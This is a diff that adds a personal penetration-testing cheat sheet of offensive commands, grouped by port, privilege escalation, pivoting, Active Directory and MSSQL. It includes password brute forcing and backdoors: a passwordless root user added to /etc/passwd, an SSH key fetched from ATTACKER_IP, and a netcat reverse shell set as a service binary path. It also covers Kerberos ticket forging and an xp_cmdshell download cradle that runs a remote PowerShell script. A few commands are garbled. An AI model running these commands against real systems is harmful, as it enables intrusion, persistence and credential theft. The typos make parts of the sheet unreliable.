@@ -1,0 +1,374 @@
+This is a resume of what I've learnt from "https://book.hacktricks.xyz/", "https://pentestbook.six2dez.com/", "https://www.youtube.com/@S4viOnLive", "https://www.youtube.com/@ippsec" and "https://www.youtube.com/@AmrSecOfficial". So THANKS to all of them and to the cybersecurity community!
+Use this knowledge for good reasons!
+
+
+
+--- ORGANIZATION ---
+### FOLDER STRUCTURE ###
+mkdir target && cd target && mkdir enum content exploits
+
+
+
+--- COMMON ---
+
+### Ip Enumeration ###
+hostname -i
+
+### Local Net Enumeration ###
+arp-scan --localnet
+
+### OS Enumeration ### (ttl=64 [Linux] / ttl=124 [Windows])
+ping -c4 <IP>
+
+### Port Enumeration ###
+nmap -sCV -p- --open <IP> -oN ports.txt
+
+### Web Application Enumeration ###
+whatweb <IP> >> whatweb.txt | webanalyze - host http://example.com - crawl 2
+
+### Web Directory Enumeration ###
+diresearch -u <URL> -e* -x 404 -w /wordlist -o dirsearch.txt
+
+### Subdomain Enumeration ### (Check crt.sh)
+ffuf -c -u <URL> -H "Host: FUZZ.example.com" -w /Discovery/DNS/subdomains -ac -mc -all
+wfuzz -c -w /Discovery/DNS/subdomains --hc 404 -h "Host: FUZZ.example.com" -u http://example.com -t 100
+subfinder -d example.com --all --recursive -o subfinder.txt && subfinder -d example.com | httpx -o AliveSubs.txt | nuclei
+
+### Active Directory Enumeration ###
+gobuster dns -d domain.local -t 25 -w /Discovery/DNS/subdomain
+
+### Add Domains ###
+echo "<IP> example.com sub.example.com" >> /etc/hosts
+
+### Exploit Enumeration ###
+searchsploit <service> -m /path/example.py (copy the exploit) -x (inspect exploit)
+
+
+
+--- PORTS ---
+
+### 21 (FTP) ###
+ftp <IP> anonymous
+hydra -l root -P pass.txt <IP> ftp
+wget -m ftp://user:pass@IP | wget -r --user="usr" --password="pswd" ftp://server.com/
+
+### 22 (SSH) ###
+ssh user@IP /bin/bash | ssh -p <PORT> <IP> | ssh -t user@<IP> bash
+msf> use scanner/ssh/ssh_enumusers
+crackmapexec ssh --help
+
+### 25, 465, 587 (SMTP) ###
+nmap --script smtp-enum-users <IP>
+
+### 80, 443 (HTTP) ###
+cewl example.com -m 5 creds.txt
+hydra -L /wordlists/users.txt -P /wordlists/password.txt example.com http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
+nuclei -ut && nuclei -target <URL> -t /template
+cmsmap -F -d <URL> | cmsmap -f W/J/D/M -u a -p a http://example.com
+GET: sqlmap -u "<URL>" -p "<PARAM_TO_TEST>" | POST: sqlmap -u "<URL>" --data "username=*&password=*"
+wpscan --force update -e --url <URL>
+joomscan --ec -u <URL>
+sslscan <host:port>
+droopescan scan drupal -u https://example.com -t 32
+
+### 88 (Kerberos) ###
+msf> use auxiliary/gather/kerberos_enumusers
+python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt
+
+### 111 (RPCbind) ###
+rpcinfo -p <IP>
+rpcclient -U "" <IP>
+
+### 135, 593 (MSRPC) ###
+rpcdump <IP> -p 135 | rpcdump DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
+rpcclient -U "" -N <IP>
+
+### 137, 138, 139 (NetBios) ###
+nmblookup -A <IP>
+nbtscan -r <IP>/24
+
+### 139, 445 (SMB) ###
+enum4linux -a <IP> | enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>
+smbclient -L \\\\IP\\ | smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //
+smbmap -H <IP> -P <PORT> | smbmap -R <dir> -H <IP> -A <doc.txt> -q | smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>
+crackmapexec smb <IP> -u '' -p '' || crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq || crackmapexec smb <IP> -u users.txt -p passwords.txt || crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
+psexec \\<IP> -u Administartor -p 123456
+msf> use auxiliary/gather/kerberos_enumusers | msf> use auxiliary/scanner/smb/smb_login
+medusa -h 10.11.1.111 -u <usr> -P /Passwords/common.txt -M smbnt
+
+### 389, 636, 3268, 3269 (LDAP) ###
+ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" + | ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>" | ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
+nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
+crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
+
+### 1433 (MSSQL) ###
+msf> use auxiliary/scanner/mssql/mssql_ping
+responder -I <Interface> -> msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
+python MultiRelay.py -t <IP> -u ALL -d (Dump Hashes)
+crackmapexec mssql -d <Domain> -u <usr> -p <pwd> -x "whoami" | -H <hash>
+
+### 3306 (MySQL) ###
+mysql -h <Hostname> -u root@example.com
+
+### 3389 (RDP) ###
+hydra -L usernames.txt - p 'pass123' <IP> rdp
+rdp_check <domain>/<name>:<password>@<IP>
+rdesktop -u <username> <IP>
+
+### 5985, 5986 (WinRM) ###
+crackmapexec winrm <IP> -d <Domain> -u usernames.txt -p passwords.txt
+evil-winrm -u <username> -p <password> -i <IP>/<Domain> | evil-winrm -u <username> -H <Hash> -i <IP>
+winrs -r:http://bizintel:5446 -u:ta\redsuit -p:2600leet hostname
+
+
+
+--- SHELL --- (Check RevShells.com)
+
+### Python Shell ###
+python3 -c 'import pty; pty.spawn("/bin/bash")' -> CTRL+Z -> stty raw -echo; fg -> enter x2 -> reset xterm -> export TERM=xterm -> stty rows 38 columns 116
+
+### Without Python ###
+echo os.system('/bin/bash') | /bin/sh -i
+
+
+
+--- FILE TRASNFER ---
+
+### Upload ###
+python3 -m http.server <PORT>
+
+### Download ###
+wget http://<IP>:<PORT>/
+curl -O http://www.domain.com/file.flv
+
+
+
+--- PIVOTING / PORT-FORWARDING ---
+
+### Nmap Without Nmap ###
+for ip in {1..5}; do for port in {21,22,5000,8000,3306}; do (echo >/dev/tcp/172.18.0.$ip/$port) >& /dev/null && echo "172.18.0.$ip port $port is open"; done; done
+
+### Chisel ###
+chisel server --auth "test:123" -p 443 --reverse | chisel server -p 8888 --host 192.168.2.149 --reverse -v
+./chisel client --auth "test:123" 10.10.10.10:443 R:socks | chisel client -v http://192.168.2.149:8888 R:127.0.0.1:44444:10.42.42.2:80
+
+### Remote Port Forwarding ###
+ssh -N -R 10.10.1.1:4455:127.0.0.1:445 attacker@10.10.1.1
+
+
+
+--- LINUX --- (Check GTFOBins & LinPEAS)
+
+### Check Binaries ###
+getcap -r / 2>/dev/null
+
+### Check Python ###
+which python python2 python3
+
+### Check OS ###
+cat /etc/os-release 2>/dev/null
+
+### Check Command Privilages ###
+sudo -l
+
+### Check Kernel ###
+cat /proc/version | uname -a | searchsploit "Linux_Kernel"
+
+### Check Write Permissions on Any Folder ###
+echo $PATH
+
+### Check Vulnerable Software ###
+dpkg -l (Debian) | rpm -qa (CentOS)
+
+### Check Process Privilege ###
+ps aux | ps -ef | top -n 1
+
+### Check Scheduled Jobs ###
+crontab -l | ls -al /etc/cron* /etc/at* | cat /etc/cron* /etc/at*
+
+### Check systemd PATH ###
+systemctl show-environment
+
+### Check Open Local Ports ###
+netsat -punta || ss --ntpu | grep "127.0"
+
+### Check Logged Users ###
+w -> last | tail -> lastlog
+
+### List All Users ###
+cat /etc/passwd | cut -d: -f1 (sytem) | grep "sh$" (console)
+
+### List All Users & Groups ###
+for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
+
+### Add DUMMY ###
+echo 'dummy::0:0::/root:/bin/bash' >> /etc/passwd -> su dummy
+
+### Execute Root Bash Payload ###
+cp /bin/bash /tmp/b && chmod +s /tmp/b -> /bin/b -p
+
+### Add Public Key to Auth Keys ###
+curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+
+
+
+--- WINDOWS --- (Check Juicy/SweetPotato & WinPEAS)
+
+### Check Privileges & Token ###
+whoami /priv | whoami /all
+
+### Check Network Interface ###
+ipconfig /all
+
+### Check Routing Table ###
+route print
+
+### Check ARP Table ###
+arp -A
+
+### Check System ###
+systeminfo
+
+### Check Open Local Ports ###
+netsat -ano
+
+### Check List of Computers ###
+net view
+
+### Check WiFi ###
+netsh wlan show
+
+## Check Firewall ###
+netsh firewall show state && netsh firewall show config
+
+### Check Env Variables ###
+set -> dir env: -> Get-ChildrenItem Env: | ft Key,Value
+
+### Check AlwaysInstallElevated [0x1] (MSI Privilege Escalation) ###
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi | msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi
+msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
+
+### Check Users & Groups ###
+CMD: net users | net localgroup Administrators
+PS: Get-ChildItem C:\Users -Force | select Name && Get-LocalGroupMember Administrators | ft Name, PrincipalSource
+
+### Check Logged Users / Sessions ###
+qwinsta / klist sessions
+
+### Check Passwords Policy ###
+net accounts
+
+### Check Processes & Services ###
+tasklist /SVC
+
+### Check Third Party Drivers ###
+driverquery
+
+### Check Permissions of Binaries ###
+dir /a "C:\Program Files" | reg query HKEY_LOCAL_MACHINE\SOFTWARE
+
+### Check Startup Binaries ###
+wmic startup get caption,command 2>nul & ^
+
+### Modify Binary Path ###
+sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+
+### Restart Service ###
+net stop [service name] && net start [service name]
+
+
+
+--- ACTIVE DIRECTORY --- (Check WADComs)
+
+### Check Info About Domain ###
+Get-Domain && Get-NetDomain
+
+### Check Groups ###
+Get-NetGroup | select samaccountname, admincount, description
+
+### Check User ###
+Get-NetUser -UserName student107
+
+### Check Members & Modify Permissions ###
+Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
+Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
+
+### Check Recycle Bin ###
+Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+
+### Check files/extensions blacklisted/whitelisted ###
+Get-ApplockerPolicy -Effective -xml
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+$a = Get-ApplockerPolicy -effective
+$a.rulecollections
+
+### OverPass The Hash/Pass The Key ###
+python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
+export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
+python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
+
+### Pass The Ticket (Linux) ###
+export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK 
+python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
+
+### Pass The Ticket (Windows) ###
+mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
+.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
+klist
+.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
+
+### Give Access to WinRM PS Console ###
+Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose | Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove
+
+### Remote Access to Hashes ###
+Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
+Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose
+Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
+Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
+
+### SILVER TICKET (Windows) ###
+mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
+mimikatz.exe "kerberos::ptt <TICKET_FILE>"
+.\PsExec.exe -accepteula \\<TARGET> cmd
+
+### SILVER TICKET (Linux) ###
+python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
+export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
+python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
+
+### GOLDEN TICKET (Windows) ###
+Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
+mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
+/user is the username to impersonate (could be anything)
+/domain is the current domain.
+/sid is the current domain SID.
+/sids is the SID of the target group to add ourselves to.
+/aes256 is the AES256 key of the current domain's krbtgt account.
+
+### GOLDEN TICKET (Linux) ###
+lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
+lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"
+ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator
+export KRB5CCNAME=hacker.ccache
+psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
+
+### DIAMOND TICKET ###
+Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap | Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt
+
+
+
+--- MSSQL AD --- (Check PowerUpSQL)
+
+### Check MSSQL Instance ###
+Get-SQLInstanceLocal | Get-SQLServerInfo | Get-SQLInstanceDomain
+
+### Perform SQL Query ###
+Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
+
+### MSSQL RCE ###
+Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
+
+### Obtain a Shell ###
+Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'
